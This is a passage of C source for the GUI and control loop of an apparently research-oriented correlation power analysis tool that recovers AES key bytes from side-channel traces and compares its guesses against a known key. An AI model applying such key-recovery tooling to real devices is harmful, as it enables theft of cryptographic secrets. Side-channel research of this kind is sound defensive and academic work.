			y[iSample] = bw_low_pass(lowfilter,Get_HW(currentDLval,currentCLKval));
		}
	}
	clock_gettime(CLOCK_MONOTONIC_RAW, &endTime);
	duration = (uint32_t)((endTime.tv_sec - startTime.tv_sec) * 1000 + (endTime.tv_nsec - startTime.tv_nsec) / 1000000);

	if(exitCallback)
	{
		if (timeoutView != 0) {
		g_source_remove(timeoutView);
		}
		timeoutView = 0;
		exitCallback = 0;
		gtk_widget_destroy(window);
		gtk_widget_destroy(chart);
		gtk_main_quit();
	}
	else
	{
	timeoutView = g_timeout_add (duration+50, (GSourceFunc)view_timer_callback, (gpointer) chart);
	slope_chart_redraw(SLOPE_CHART(chart));
	}


	return timeoutView;
}

/*
 * Compute, update and display correlation results
 */
static gboolean cpaupdate(GtkWidget *button, gpointer data)
{
	printf("\n\rUpdating CPA Results for %d traces...",iTrace);

	for (iSample = 0; iSample < nSample ; iSample++)
	{
		x[iSample]   = iSample;
		yAvg[iSample] = GlobalAverage[iSample]/ iTrace;
		yVar[iSample] = GlobalVariance[iSample] / iTrace;
		yVar[iSample] -= pow(yAvg[iSample],2);

		if(yVar[iSample]>0)
		{
			yVar[iSample] = sqrt(yVar[iSample]);
		}
	}

	yCorr = CorrelateClasses(yVar,yAvg,ClassAverage[currentByte],ClassPopulation[currentByte],NCLASS,256,iTrace,nSample,2,currentByte,0,1);
	bestguess[currentByte] = CPA_Results(yCorr,maxCorrelation,NCLASS,nSample,exKeyArray[currentByte],currentByte,NULL);

	if(verbose)
	{
		printf("\n\rcurrentByte = %d",currentByte);
		printf("\n\rClassAvg[0][0][0] = %f",ClassAverage[0][0][0]);
		printf("\n\rClassPop[0] = %d",ClassPopulation[0][0]);
		printf("\n\ryCorr[0][0] = %f",yCorr[0][0]);
	}

	slope_scale_remove_item(scaleAvg, seriesAvg);
	sprintf(legendStr,"Average, nTrace: %d, byte: %d",iTrace,currentByte);
	seriesAvg = slope_xyseries_new_filled(legendStr, x, yAvg, nSample, "l-");
	slope_scale_add_item(scaleAvg, seriesAvg);

	slope_scale_remove_item(scaleCorr, seriesCorr[0]);
	seriesCorr[0] = slope_xyseries_new_filled("Wrong", x, maxCorrelation, nSample, "la");
	slope_scale_add_item(scaleCorr, seriesCorr[0]);

	slope_scale_remove_item(scaleCorr, seriesCorr[1]);
	seriesCorr[1] = slope_xyseries_new_filled("Best", x, yCorr[bestguess[currentByte]], nSample, "g-");
	slope_scale_add_item(scaleCorr, seriesCorr[1]);

	slope_scale_remove_item(scaleCorr, seriesCorr[2]);
	seriesCorr[2] = slope_xyseries_new_filled("Right", x, yCorr[exKeyArray[currentByte]], nSample, "r-");
	slope_scale_add_item(scaleCorr, seriesCorr[2]);

	slope_chart_redraw(SLOPE_CHART(chart));

	printf("\n\rSuccess!\n\r");

	return TRUE;
}

/*
 * Select Byte correlation to display
 */
static gboolean byteselect(GtkWidget *button, gpointer data)
{
	currentByte++;

	if(currentByte == maxByte)
	{
		currentByte = 0;
	}

	printf("\n\rCurrent Byte is  %d",currentByte);

	cpaupdate(buttonUpdate,NULL);
	return TRUE;
}


static gboolean aes_timer_callback(GtkWidget *widget)
{
	FILE *fptr;

	if (timeoutAES != 0) {
	g_source_remove(timeoutAES);
	}
	timeoutAES = 0;


	clock_gettime(CLOCK_MONOTONIC_RAW, &startTime);

	if(AESMode)
	{
		for(iTry = 0 ;  iTry < refreshRateAES ;  iTry++)
		{
			 if(Launch_AES()==0){break;}
		}
	}
	else
	{
		for(iTry = 0 ;  iTry < refreshRateCPA ;  iTry++)
		{
			 if(Launch_AES()==0){break;}
		}
	}

	clock_gettime(CLOCK_MONOTONIC_RAW, &endTime);


	duration = (uint32_t)((endTime.tv_sec - startTime.tv_sec) * 1000 + (endTime.tv_nsec - startTime.tv_nsec) / 1000000);
	printf("\n\rHot: %d, Cold: %d, Discard: %d", counterHOT,counterCOLD,counterDiscard);
	//relaunch condition
	if(iTrace < nTrace)
	{
		if(AESMode)
		{
			printf("\n\rDuration: %d for %d traces per timeout\n\r", duration,refreshRateAES);

			for(iSample = 0 ; iSample < nSample ; iSample++)
			{
				y[iSample] = GlobalAverage[iSample]/iTrace;
			}

			sprintf(legendStr,"AES acquisition, nTrace: %d",iTrace);
			slope_scale_remove_item(scaleAvg,seriesAvg);
			seriesAvg = slope_xyseries_new_filled(legendStr, x, y, nSample, "l-");
			slope_scale_add_item(scaleAvg, seriesAvg);
			slope_chart_redraw(SLOPE_CHART(chart));
		}
		else
		{
			printf("\n\rDuration: %d for %d traces per timeout\n\r", duration,refreshRateCPA);
		}

		if(!exitCallback)
		{
		timeoutAES = g_timeout_add (duration, (GSourceFunc)aes_timer_callback, (gpointer) chart);
		}
	}
	else
	{
		updateend = 1;
		if(AESMode)
		{
			for(iSample = 0 ; iSample < nSample ; iSample++)
			{
				y[iSample] = GlobalAverage[iSample]/iTrace;
			}

			sprintf(legendStr,"AES acquisition, nTrace: %d",iTrace);
			slope_scale_remove_item(scaleAvg,seriesAvg);
			seriesAvg = slope_xyseries_new_filled(legendStr, x, y, nSample, "l-");
			slope_scale_add_item(scaleAvg, seriesAvg);
			slope_chart_redraw(SLOPE_CHART(chart));
		}
		else
		{
			printf("\n\rUpdating CPA Window...");
			cpaupdate(buttonUpdate,NULL);

			if(saveCPA)
			{
				printf("\n\rSaving Correlation Results...");
				fptr = fopen("CPAresults.log","w");
				for(iByte = 0 ; iByte < NBYTE ; iByte++)
				{
					yCorr = CorrelateClasses(yVar,yAvg,ClassAverage[iByte],ClassPopulation[iByte],NCLASS,256,iTrace,nSample,2,iByte,0,1);
					bestguess[iByte] = CPA_Results(yCorr,maxCorrelation,NCLASS,nSample,exKeyArray[iByte],iByte,fptr);
				}
				fclose(fptr);
			}

		}
		printf("\n\r\n\rEnd!");
		printf("\n\rCounterHOT: %d",counterHOT);
		printf("\n\rCounterCOLD: %d",counterCOLD);
		printf("\n\rCounterDISCARD: %d",counterDiscard);
		printf("\n\r\n\rPlease exit the graph window on screen to access the command line\n\r");
	}

	if(exitCallback)
	{
		if (timeoutAES != 0) {
		g_source_remove(timeoutAES);
		}
		timeoutAES = 0;
		exitCallback = 0;
		gtk_widget_destroy(window);
		gtk_widget_destroy(chart);
		gtk_main_quit();
	}

	return timeoutAES;
}





